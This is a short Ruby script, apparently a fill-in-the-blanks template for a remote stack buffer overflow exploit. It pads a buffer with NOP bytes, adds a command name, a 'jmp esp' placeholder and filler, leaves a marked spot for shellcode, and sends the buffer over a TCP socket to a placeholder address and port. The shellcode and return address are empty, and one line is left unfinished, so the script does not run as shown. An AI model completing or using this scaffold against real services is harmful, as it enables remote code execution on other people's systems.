#!/usr/bin/ruby

buff = "\x90"*offset #No-Op. Replace offset with actual value
buff+= "COMMAND " #replace COMMAND with name of command, or remove completely
buff+= "" #jmp esp
buff+= "B"*10 #Additional no-ops for argument values
buff+= 
#Shellcode


require 'socket'

TCPSocket.open("ip address",port){ |s| s.puts buff }
